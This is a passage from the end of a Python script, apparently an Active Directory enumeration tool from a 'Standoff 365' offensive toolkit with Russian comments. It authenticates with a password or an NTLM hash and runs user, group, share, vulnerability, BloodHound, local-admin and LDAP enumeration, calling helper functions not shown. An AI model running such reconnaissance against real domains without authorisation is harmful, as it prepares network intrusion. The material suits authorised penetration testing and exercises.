    p.add_argument("--skip-vulns",     action="store_true")
    p.add_argument("--skip-shares",    action="store_true")
    return p.parse_args()


def main():
    import re  # нужен для парсинга
    args = parse_args()

    if not args.password and not args.hash:
        print("[-] Укажи -p (пароль) или -H (NTLM хеш)")
        sys.exit(1)

    t = Target(
        domain   = args.domain.lower(),
        dc       = args.dc,
        username = args.username,
        password = args.password or None,
        ntlm_hash = args.hash or None,
        out_dir  = args.out,
    )

    if HAS_RICH:
        console.print(Panel.fit(
            f"[bold cyan]ad_enum.py[/bold cyan]\n"
            f"[green]Домен:[/green]  {t.domain}\n"
            f"[green]DC:[/green]     {t.dc}\n"
            f"[green]User:[/green]   {t.username}\n"
            f"[green]Auth:[/green]   {'NTLM Hash' if t.ntlm else 'Password'}\n"
            f"[green]Output:[/green] {t.out_dir}",
            title="Standoff 365 Toolkit — AD Enum",
            border_style="cyan"
        ))

    all_results = {}

    # Только уязвимости
    if args.only_vulns:
        all_results["vulns"] = check_ad_vulns(t)
        generate_report(t, all_results)
        return

    # Проверка подключения
    all_results["connectivity"] = check_connectivity(t)

    if args.only_users:
        all_results["users"] = enum_users(t)
        generate_report(t, all_results)
        return

    # Полное перечисление
    all_results["policy"]    = get_password_policy(t)
    all_results["users"]     = enum_users(t)
    all_results["groups"]    = enum_groups(t)
    all_results["computers"] = enum_computers(t)

    if not args.skip_shares:
        all_results["shares"] = enum_shares(t)

    if not args.skip_vulns:
        all_results["vulns"] = check_ad_vulns(t)

    # BloodHound — в полном режиме или явно не пропущен
    if args.full and not args.skip_bloodhound:
        all_results["bloodhound"] = bloodhound_collect(t)

    # Local admin sweep — только в полном режиме
    if args.full:
        all_results["local_admin"] = check_local_admin(t, args.targets)

    # LDAP dump
    all_results["ldap_dump"] = ldap_dump(t)

    generate_report(t, all_results)
    save_json(all_results, t.out_dir / "ad_enum_full.json")
    log(f"Все результаты: {t.out_dir}", "ok")


if __name__ == "__main__":
    import re
    main()